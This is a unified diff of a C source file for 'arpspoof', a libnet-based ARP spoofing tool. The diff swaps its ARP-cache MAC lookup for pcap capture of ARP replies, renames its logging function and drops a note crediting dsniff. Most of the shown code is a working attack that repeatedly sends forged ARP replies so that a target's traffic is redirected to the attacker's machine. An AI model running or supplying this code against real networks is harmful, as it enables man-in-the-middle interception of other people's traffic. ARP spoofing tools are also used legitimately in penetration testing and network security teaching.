@@ -17,19 +17,15 @@
  * You should have received a copy of the GNU General Public License
  * along with this program; if not, write to the Free Software Foundation,
  * Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
- *
- * *Note*
- * The function `arp_cache_lookup', `arp_force' and `get_mac_by_ip' is part
- * of the project `dsniff'.
- *
  */
 
-#include <errno.h>
+#include <arpa/inet.h>
 #include <getopt.h>
 #include <libnet.h>
 #include <net/if_arp.h>
 #include <netinet/ether.h>
 #include <netinet/in.h>
+#include <pcap.h>
 #include <signal.h>
 #include <stdio.h>
 #include <sys/ioctl.h>
@@ -38,19 +34,19 @@
 
 #define IP_ADDR_LEN 4
 
-#define LOG_FATAL   0x1
-#define LOG_LIBNET  0x2
-
-extern int errno;
+#define LOG_INFO    0x1
+#define LOG_FATAL   0x2
+#define LOG_LIBNET  0x4
+#define LOG_PCAP    0x8
 
 void usage(void);
-void log_error(int level, const char *fmt, ...);
+void slog(int level, const char *fmt, ...);
 void build_packet(int op, u_int8_t* src_ip, u_int8_t* src_mac,
     u_int8_t* dst_ip, u_int8_t* dst_mac);
 void start_spoof(int send_interval);
-int arp_cache_lookup(in_addr_t ip, struct libnet_ether_addr *mac);
 int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac);
-int arp_force(in_addr_t dst);
+void arp_packet_handler_cb(u_char* imp, const struct pcap_pkthdr* pkinfo,
+                                 const u_char* packet);
 
 const char* program_name = "arpspoof";
 const char* program_version = "0.1";
@@ -65,20 +61,29 @@ static struct option longopts[] = {
 };
 
 libnet_t* lnc = 0;
-char* target_ip_str = NULL;            /* IP which packets is send to */
-char* spoof_ip_str = NULL;             /* IP we want to intercept packets */
-char* redirect_ip_str  = NULL;         /* IP of MAC we want to redirect 
-                                          packets to, if not specified,
-                                          attacker's MAC is used */
+pcap_t* pcc = 0;
 in_addr_t tgt_ip = 0, red_ip = 0, spf_ip = 0;
 struct libnet_ether_addr tgt_mac, red_mac;
 char* intf = NULL;                     /* interface */
 
+typedef struct _ip_mac_pair {
+  int complete;                  /* whether ip and mac are both specified */
+  in_addr_t* ip;
+  struct libnet_ether_addr* mac;
+} ip_mac_pair;
+
 int main(int argc, char *argv[])
 {
-  char err_buf[LIBNET_ERRBUF_SIZE];
+  char err_buf[LIBNET_ERRBUF_SIZE > PCAP_ERRBUF_SIZE?
+               LIBNET_ERRBUF_SIZE: PCAP_ERRBUF_SIZE];
+  struct bpf_program bp;
   int opt = 0;
   int send_interval = 1000000;           /* send interval in usecond */
+  char* target_ip_str = NULL;            /* IP which packets is send to */
+  char* spoof_ip_str = NULL;             /* IP we want to intercept packets */
+  char* redirect_ip_str  = NULL;         /* IP of MAC we want to redirect 
+                                            packets to, if not specified,
+                                            attacker's MAC is used */
 
   while ((opt = getopt_long(argc, argv, "i:n:t:r:hv", longopts, NULL)) != -1) {
     switch(opt) {
@@ -114,32 +119,44 @@ int main(int argc, char *argv[])
     exit(1);
   }
 
-  /* Initialize libnet context */
+  /* libnet init */
   lnc = libnet_init(LIBNET_LINK_ADV, intf, err_buf);
 
+  /* pcap init */
+  if (!(pcc = pcap_open_live(intf, 100, 0, 10, err_buf)))
+    slog(LOG_PCAP, "pcap_init_live() error\n");
+
+  /* set capture filter */
+  if (-1 == pcap_compile(pcc, &bp, "arp", 0, -1))
+    slog(LOG_PCAP, "pcap_compile(): error\n");
+
+  if (-1 == pcap_setfilter(pcc, &bp))
+    slog(LOG_PCAP, "pcap_setfilter(): error\n");
+
   /* If target not specified, set to broadcast */
-  if (target_ip_str)
-    tgt_ip = libnet_name2addr4(lnc, target_ip_str, LIBNET_RESOLVE);
-  if (!tgt_ip)
+  if (target_ip_str) {
+    if (-1 == (tgt_ip = libnet_name2addr4(lnc, target_ip_str, LIBNET_RESOLVE)))
+      slog(LOG_LIBNET, "invalid target IP address\n");
+    if (!get_mac_by_ip(tgt_ip, &tgt_mac))
+      slog(LOG_LIBNET, "can't resolve MAC address for %s\n", target_ip_str);
+  } else
     memcpy(tgt_mac.ether_addr_octet,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN);
-  else if (!get_mac_by_ip(tgt_ip, &tgt_mac))
-    log_error(LOG_FATAL | LOG_LIBNET, "can't resolve MAC address for %s\n",
-              target_ip_str);
 
   /* If redirect IP not specified, packets are redirect to the attacker */
-  if (redirect_ip_str)
-    red_ip = libnet_name2addr4(lnc, redirect_ip_str, LIBNET_RESOLVE);
-  if (!red_ip) {
+  if (redirect_ip_str) {
+    if (-1 == (red_ip = libnet_name2addr4(lnc,redirect_ip_str,LIBNET_RESOLVE)))
+      slog(LOG_LIBNET, "invalid redirect IP address\n");
+    if (!get_mac_by_ip(red_ip, &red_mac))
+      slog(LOG_FATAL, "can't resolve MAC address for %s\n",redirect_ip_str);
+  } else {
     struct libnet_ether_addr* ptmp = libnet_get_hwaddr(lnc);
     if (ptmp == NULL)
-      log_error(LOG_FATAL | LOG_LIBNET,
-                "can't resolve MAC address for localhost\n");
+      slog(LOG_LIBNET, "can't resolve MAC address for localhost\n");
     memcpy(red_mac.ether_addr_octet, ptmp->ether_addr_octet, ETHER_ADDR_LEN);
-  } else if (!get_mac_by_ip(red_ip, &red_mac))
-    log_error(LOG_FATAL, "can't resolve MAC address for %s\n",redirect_ip_str);
+  }
 
   if (optind == argc)
-    log_error(LOG_FATAL, "must specified host IP address\n");
+    slog(LOG_FATAL, "must specified host IP address\n");
   spoof_ip_str = argv[optind];
   spf_ip = libnet_name2addr4(lnc, spoof_ip_str, LIBNET_RESOLVE);
 
@@ -175,7 +192,7 @@ void build_packet(int op, u_int8_t* src_ip, u_int8_t* src_mac,
   );
 
   if (-1 == p_tag)
-    log_error(LOG_FATAL | LOG_LIBNET, "can't build arp header\n");
+    slog(LOG_LIBNET, "can't build arp header\n");
 
   if (op == ARPOP_REQUEST)
     dst_mac = (u_int8_t*)"\xff\xff\xff\xff\xff\xff";
@@ -191,124 +208,100 @@ void build_packet(int op, u_int8_t* src_ip, u_int8_t* src_mac,
   );
 
   if (-1 == p_tag)
-    log_error(LOG_FATAL | LOG_LIBNET, "can't build ethernet header\n");
+    slog(LOG_LIBNET, "can't build ethernet header\n");
 }
 
 void start_spoof(int send_interval) {
-  int size = 0;
+  int c = 0;
   while (1) {
-    if (-1 == (size = libnet_write(lnc))) {
-      log_error(LOG_LIBNET | LOG_LIBNET, "can't send packet\n");
+    if (-1 == libnet_write(lnc)) {
+      slog(LOG_LIBNET, "can't send packet\n");
     }
-    if (target_ip_str)
-      printf("%s: %d bytes, target: %s: %s is at %s\n", intf, size, 
-        target_ip_str, spoof_ip_str, ether_ntoa((struct ether_addr*)&red_mac));
-    else
-      printf("%s: %d bytes, target: broadcasting: %s is at %s\n", intf, size, 
-        spoof_ip_str, ether_ntoa((struct ether_addr*)&red_mac));
+    if (tgt_ip != 0) {
+      printf("%s: 42 bytes, target: %s: %s is at ", intf,
+        libnet_addr2name4(tgt_ip, LIBNET_DONT_RESOLVE),
+        libnet_addr2name4(spf_ip, LIBNET_DONT_RESOLVE));
+      for (c = 0; c < 6; c++)
+        printf("%.2x%c", ((u_char*)&red_mac)[c], (c < 5)? ':': '\n');
+    } else {
+      printf("%s: 42 bytes, target: broadcasting: %s is at ", intf,
+        libnet_addr2name4(spf_ip, LIBNET_DONT_RESOLVE));
+      for (c = 0; c < 6; c++)
+        printf("%.2x%c", ((u_char*)&red_mac)[c], (c < 5)? ':': '\n');
+    }
     usleep(send_interval);
   }
 }
 
-int arp_cache_lookup(in_addr_t ip, struct libnet_ether_addr *mac) {
-  int sock = 0;
-  struct arpreq ar;
-  struct sockaddr_in *sin;
-
-  memset((char*)&ar, 0, sizeof(ar));
-
-#ifdef __linux__
-  strncpy(ar.arp_dev, intf, sizeof(ar.arp_dev));
-#endif
-
-  sin = (struct sockaddr_in *)&ar.arp_pa;
-  sin->sin_family = AF_INET;
-  sin->sin_addr.s_addr = ip;
-
-  if (-1 == (sock = socket(AF_INET, SOCK_DGRAM, 0)))
-    return -1;
-  if (-1 == ioctl(sock, SIOCGARP, (caddr_t)&ar)) {
-    close(sock);
-    return -1;
-  }
-  close(sock);
-  memcpy(mac->ether_addr_octet, ar.arp_ha.sa_data, ETHER_ADDR_LEN);
-  return 0;
-}
-
 int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac) {
   int i = 0;
+  ip_mac_pair imp = {0, &ip, mac};
+
+  in_addr_t local_ip = libnet_get_ipaddr4(lnc);
+  struct libnet_ether_addr* local_mac = libnet_get_hwaddr(lnc);
+
+  if (local_mac == NULL)
+    slog(LOG_LIBNET, "can't resolve MAC address for localhost\n");
+  build_packet(ARPOP_REQUEST, (u_int8_t*)&local_ip, (u_int8_t*)local_mac,
+               (u_int8_t*)&ip, (u_int8_t*)"\x00\x00\x00\x00\x00\x00");
+
+    printf("%s: 42 bytes, broadcasting: Who has %s? Tell %s\n", intf,
+        libnet_addr2name4(ip, LIBNET_DONT_RESOLVE),
+        libnet_addr2name4(local_ip, LIBNET_DONT_RESOLVE));
   do {
-    if (arp_cache_lookup(ip, mac) == 0) {
-#ifdef __linux__
-      /* arp_cache_lookup only determines if there is an entry in ARP cache, we
-       * also need no see if the MAC is valid.
-       * Linux kernel send an ARP request and add a new row in the ARP cache.
-       * If we do not get an ARP reply(target is down?), the MAC address in
-       * ARP cache will be 00:00:00:00:00:00.*/
-      if (memcmp((char*)mac, "\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN) != 0)
-        return 1;
-      else
-        return 0;
-#else
+    /* send arp request */
+    if (-1 == libnet_write(lnc))
+      slog(LOG_LIBNET, "can't send packet\n");
+
+    /* capture arp reply */
+    *mac->ether_addr_octet = 0;
+    pcap_dispatch(pcc, 1, arp_packet_handler_cb, (u_char*) &imp);
+    if (imp.complete) {
+      int c = 0;
+      printf("%s: 42 bytes, received: %s is at ", intf,
+          libnet_addr2name4(ip, LIBNET_DONT_RESOLVE));
+      for (c = 0; c < 6; c++)
+        printf("%.2x%c", ((u_char*)(imp.mac))[c], (c < 5)? ':': '\n');
       return 1;
-#endif
     }
-
-#ifdef __linux__
-    /* since linux does not accept unsolicited ARP replies, we can not get the
-     * mac address by sending an ARP request. Instead we use arp_force to send
-     * arbitrirary data. In order to send data to the target, kernel will
-     * update ARP cache and we can get the target MAC address.*/
-    arp_force(ip);
-#else
-    /* get ip */
-    in_addr_t local_ip = libnet_get_ipaddr4(lnc);
-
-    /* get mac */
-    struct libnet_ether_addr* local_mac = libnet_get_hwaddr(lnc);
-    if (local_mac == NULL)
-      log_error(LOG_FATAL | LOG_LIBNET,
-                "can't resolve MAC address for localhost\n");
-    build_packet(ARPOP_REQUEST, (u_int8_t*)&local_ip, (u_int8_t*)local_mac,
-                 (u_int8_t*)&ip, (u_int8_t*)"\x00\x00\x00\x00\x00\x00");
-    if (-1 == libnet_write(lnc)) {
-      log_error(LOG_FATAL | LOG_LIBNET, "can't send packet\n");
-    }
-#endif
-    sleep(1);
+    usleep(100000);
   }
-  while (i++ < 3);
+  while (++i < 30); /* try for 3 seconds */
   return 0;
 }
 
-#ifdef __linux__
-int arp_force(in_addr_t dst)
-{
-  struct sockaddr_in sin;
-  int i, fd;
+void arp_packet_handler_cb(u_char* imp, const struct pcap_pkthdr* pkinfo,
+                                 const u_char* packet) {
+  struct libnet_802_3_hdr *h_eth;
+  struct libnet_arp_hdr *h_arp;
 
-  if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
-    return 0;
+  h_eth = (void*)packet;
+  h_arp = (void*)((char*)h_eth + LIBNET_ETH_H);
 
-  memset(&sin, 0, sizeof(sin));
-  sin.sin_family = AF_INET;
-  sin.sin_addr.s_addr = dst;
-  sin.sin_port = htons(67);
-
-  i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
-
-  close(fd);
-
-  return (i == 0);
+  if ((htons(h_arp->ar_op) == ARPOP_REPLY)
+      && (htons(h_arp->ar_pro) == ETHERTYPE_IP)
+      && (htons(h_arp->ar_hrd) == ARPHRD_ETHER)) {
+    in_addr_t ip;
+    memcpy(&ip, (char*)h_arp + LIBNET_ARP_H + h_arp->ar_hln, 4);
+    if (memcmp(&ip, ((ip_mac_pair*)imp)->ip, IP_ADDR_LEN) == 0) {
+      memcpy(((ip_mac_pair*)imp)->mac, h_eth->_802_3_shost, ETHER_ADDR_LEN);
+      ((ip_mac_pair*)imp)->complete = 1;
+      return;
+    }
+  }
 }
-#endif
 
-void log_error(int level, const char *fmt, ...) {
+void slog(int level, const char *fmt, ...) {
   va_list vap;
 
   if ((level & LOG_LIBNET) == LOG_LIBNET) {
     char* tmp = libnet_geterror(lnc);
+    if (tmp && strlen(tmp) != 0)
+      fprintf(stderr, "%s: %s\n", program_name, tmp);
+  }
+
+  if ((level & LOG_PCAP) == LOG_PCAP) {
+    char* tmp = pcap_geterr(pcc);
     if (tmp && strlen(tmp) != 0)
       fprintf(stderr, "%s: %s\n", program_name, tmp);
   }
@@ -318,7 +311,7 @@ void log_error(int level, const char *fmt, ...) {
   vfprintf(stderr, fmt, vap);
   va_end(vap);
 
-  if ((level & LOG_FATAL) == LOG_FATAL)
+  if ((level & LOG_INFO) != LOG_INFO)
     exit(1);
 }
 
